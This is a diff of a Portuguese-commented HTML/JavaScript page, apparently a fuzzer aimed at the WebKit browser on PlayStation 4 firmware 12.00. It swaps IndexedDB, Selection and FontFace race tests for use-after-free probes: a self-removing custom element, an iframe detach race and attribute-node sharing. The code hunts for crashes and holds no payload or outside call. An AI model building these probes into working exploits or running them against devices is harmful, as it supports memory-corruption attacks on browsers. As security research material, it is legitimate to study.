@@ -2,164 +2,152 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Storage & State Fuzzer</title>
+    <title>PS4 12.00 Lifecycle Killer</title>
     <style>
         body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
         button { 
-            background: #fff; color: #000; border: none; 
-            padding: 15px; width: 100%; margin-bottom: 10px; 
-            font-size: 16px; font-weight: bold; cursor: pointer; text-align: left;
+            background: #fff; color: #000; border: 1px solid #333; 
+            padding: 20px; width: 100%; margin-bottom: 15px; 
+            font-size: 18px; font-weight: bold; cursor: pointer; text-align: left;
         }
         button:hover { background: #ccc; }
         #log { border-top: 1px solid #fff; padding-top: 10px; margin-top: 20px; white-space: pre-wrap; }
-        #editor { background: #222; padding: 10px; min-height: 50px; }
     </style>
 </head>
 <body>
 
-    <h1>STORAGE & STATE ATTACKS</h1>
-    <p>Target: IndexedDB Transactions & DOM Selection Range</p>
+    <h1>OBJECT LIFECYCLE ATTACKS</h1>
+    <p>Target: WebCore DOM State Machine (Custom Elements / Frames)</p>
 
-    <button onclick="runIDBRace()">TEST 1: IndexedDB Transaction Abort Race</button>
-    <button onclick="runSelectionChaos()">TEST 2: Selection API Range Chaos</button>
-    <button onclick="runFontFaceCrash()">TEST 3: FontFace Lifecycle UAF</button>
-
-    <div id="editor" contenteditable="true">Texto editável para teste de seleção...</div>
-    <div id="log">Status: Pronto.</div>
+    <button onclick="runCustomElementUAF()">TEST 1: Custom Element Suicide (UAF)</button>
+    <button onclick="runFrameDetach()">TEST 2: Iframe Detach Race</button>
+    <button onclick="runAttributeConfusion()">TEST 3: Attribute Node Confusion</button>
+    
+    <div id="container"></div>
+    <div id="log">Status: Aguardando...</div>
 
     <script>
         function log(msg) { 
             document.getElementById('log').innerText = `> ${msg}\n` + document.getElementById('log').innerText;
         }
 
-        // TESTE 1: IndexedDB Race
-        // Tenta criar e abortar transações rapidamente.
-        // O objetivo é confundir o gerenciador de estado do banco de dados.
-        function runIDBRace() {
-            log("Iniciando IndexedDB Transaction Race...");
-            const request = indexedDB.open("CrashDB", 1);
+        // --- TESTE 1: Custom Element Suicide ---
+        // Cria um elemento que se deleta da memória ASSIM que o navegador tenta renderizá-lo.
+        // O motor C++ pode tentar acessar o ponteiro deletado logo em seguida.
+        function runCustomElementUAF() {
+            log("Iniciando Custom Element Attack...");
             
-            request.onupgradeneeded = function(e) {
-                const db = e.target.result;
-                if (!db.objectStoreNames.contains("store")) {
-                    db.createObjectStore("store");
+            try {
+                // Define um elemento "Maligno"
+                if (!customElements.get('x-suicide')) {
+                    class SuicideElement extends HTMLElement {
+                        connectedCallback() {
+                            // O GOLPE: O C++ acabou de nos conectar.
+                            // Nós nos desconectamos imediatamente.
+                            this.remove();
+                            
+                            // Agora tentamos forçar o C++ a usar o ponteiro "dangling"
+                            // acessando propriedades que exigem layout.
+                            try {
+                                this.innerHTML = "<b>CRASH</b>";
+                                const x = this.offsetWidth; 
+                                this.setAttribute("id", "dead");
+                            } catch(e) {}
+                        }
+                    }
+                    customElements.define('x-suicide', SuicideElement);
                 }
-            };
 
-            request.onsuccess = function(e) {
-                const db = e.target.result;
+                // Criação em massa para tentar acertar o timing do Garbage Collector
+                const container = document.getElementById('container');
                 let count = 0;
-                
                 const interval = setInterval(() => {
                     count++;
+                    const el = document.createElement('x-suicide');
+                    container.appendChild(el); // Dispara connectedCallback
+                    
                     if(count > 1000) {
                         clearInterval(interval);
-                        log("IDB Teste Finalizado.");
-                        return;
+                        log("Teste 1 finalizado (Sem Crash Imediato).");
                     }
+                }, 1);
 
+            } catch(e) { log("Erro: " + e.message); }
+        }
+
+        // --- TESTE 2: Iframe Detach Race ---
+        // Tenta acessar o objeto 'window' de um Iframe NO MOMENTO em que ele está sendo destruído.
+        // Clássico bug de segurança de navegadores.
+        function runFrameDetach() {
+            log("Iniciando Iframe Detach Race...");
+            
+            const frame = document.createElement('iframe');
+            document.body.appendChild(frame);
+            
+            // Prepara o ataque quando o frame carregar
+            frame.onload = function() {
+                const win = frame.contentWindow;
+                const doc = frame.contentDocument;
+                
+                // Define um evento que roda durante a destruição
+                win.onunload = function() {
+                    // O frame está morrendo. Tenta manter uma referência viva.
+                    log("Frame unloading... acessando objetos mortos.");
                     try {
-                        // Cria transação de escrita
-                        const tx = db.transaction("store", "readwrite");
-                        const store = tx.objectStore("store");
-                        
-                        // Adiciona dados
-                        store.put("Dados de Teste " + Math.random(), "key");
-                        
-                        // O GOLPE: Aborta imediatamente (50% de chance)
-                        // Isso força o rollback no meio da operação de I/O
-                        if (Math.random() > 0.5) {
-                            tx.abort();
-                        }
-                    } catch(err) { /* Ignora erros de lógica */ }
-                }, 5); // Muito rápido
+                        doc.body.innerHTML = "X";
+                        win.location.href = "about:blank";
+                    } catch(e) {}
+                };
+                
+                // O GOLPE: Remove o frame (Dispara unload)
+                setTimeout(() => {
+                    document.body.removeChild(frame);
+                    // Tenta acessar a referência 'win' que deveria estar morta
+                    try {
+                        const zombie = win.document;
+                    } catch(e) {}
+                }, 100);
             };
+            
+            frame.src = "about:blank";
         }
 
-        // TESTE 2: Selection Chaos
-        // Manipula faixas de seleção de texto (Ranges) de forma inválida.
-        // O WebKit odeia quando o "foco" da seleção desaparece.
-        function runSelectionChaos() {
-            log("Executando Selection API Fuzzer...");
-            const editor = document.getElementById('editor');
-            const sel = window.getSelection();
+        // --- TESTE 3: Attribute Node Confusion ---
+        // Manipula nós de Atributos (que são raros de usar manualmente).
+        // Tenta compartilhar o mesmo nó de atributo entre dois elementos diferentes.
+        function runAttributeConfusion() {
+            log("Iniciando Attribute Confusion...");
             
-            // Popula o editor com nós complexos
-            editor.innerHTML = "<b>Negrito</b><i>Itálico</i><span>Normal</span>".repeat(50);
-
-            let i = 0;
-            const interval = setInterval(() => {
-                i++;
-                if(i > 500) {
-                    clearInterval(interval);
-                    log("Selection Test Finalizado.");
-                    return;
+            try {
+                const el1 = document.createElement('div');
+                const el2 = document.createElement('div');
+                
+                const attr = document.createAttribute('data-hack');
+                attr.value = "payload";
+                
+                el1.setAttributeNode(attr);
+                
+                // Tenta mover o atributo para outro elemento enquanto o primeiro ainda o usa
+                // Isso pode confundir a contagem de referência (RefCount) no C++
+                el2.setAttributeNode(attr); // O WebKit deve remover de el1 automaticamente
+                
+                // Tenta acessar de volta no el1 (que deveria ter perdido o atributo)
+                if (el1.getAttribute('data-hack') === "payload") {
+                    log("Alerta Lógico: Atributo duplicado detectado!");
                 }
-
-                try {
-                    // Cria um Range aleatório
-                    const range = document.createRange();
-                    
-                    // Seleciona nós aleatórios dentro do editor
-                    const nodes = editor.childNodes;
-                    const startNode = nodes[Math.floor(Math.random() * nodes.length)];
-                    const endNode = nodes[Math.floor(Math.random() * nodes.length)];
-                    
-                    range.setStart(startNode, 0);
-                    range.setEnd(endNode, 0);
-                    
-                    // Aplica a seleção
-                    sel.removeAllRanges();
-                    sel.addRange(range);
-                    
-                    // O GOLPE: Modifica o DOM selecionado imediatamente
-                    // Tenta causar desincronia entre o Range visual e a memória
-                    startNode.textContent = "MODIFICADO";
-                    if (Math.random() > 0.8) {
-                        editor.removeChild(endNode); // Remove o nó onde a seleção termina
-                    }
-                    
-                } catch(e) {} // Ignora erros de índice inválido
-            }, 10);
-        }
-
-        // TESTE 3: FontFace Lifecycle
-        // Carrega e deleta fontes personalizadas durante a renderização.
-        function runFontFaceCrash() {
-            log("Testando ciclo de vida de Fontes...");
-            
-            const interval = setInterval(() => {
-                try {
-                    // 1. Cria uma fonte (pode ser válida ou url lixo)
-                    const fontName = "Font" + Math.random();
-                    const f = new FontFace(fontName, 'url(data:font/woff;base64,d09GRgABAAAA...)');
-                    
-                    // 2. Adiciona ao documento
-                    document.fonts.add(f);
-                    
-                    // 3. Usa a fonte num elemento
-                    const el = document.createElement('div');
-                    el.style.fontFamily = fontName;
-                    el.innerText = "TESTE DE FONTE";
-                    document.body.appendChild(el);
-                    
-                    // 4. Força renderização (Layout)
-                    const width = el.offsetWidth;
-                    
-                    // 5. O GOLPE: Remove a fonte e o elemento simultaneamente
-                    document.fonts.delete(f);
-                    document.body.removeChild(el);
-                    
-                    // Tenta acessar propriedade após delete (Race?)
-                    const check = f.status; 
-                    
-                } catch(e) {}
-            }, 20);
-
-            setTimeout(() => {
-                clearInterval(interval);
-                log("FontFace Test Finalizado.");
-            }, 5000);
+                
+                // Estressa essa troca
+                for(let i=0; i<5000; i++) {
+                    el1.setAttributeNode(attr);
+                    el2.setAttributeNode(attr);
+                }
+                
+                log("Teste 3 finalizado.");
+                
+            } catch(e) { 
+                // Erros de "InUseAttributeError" são esperados se o navegador for seguro
+                log("Browser bloqueou a troca (Seguro): " + e.message); 
+            }
         }
 
     </script>
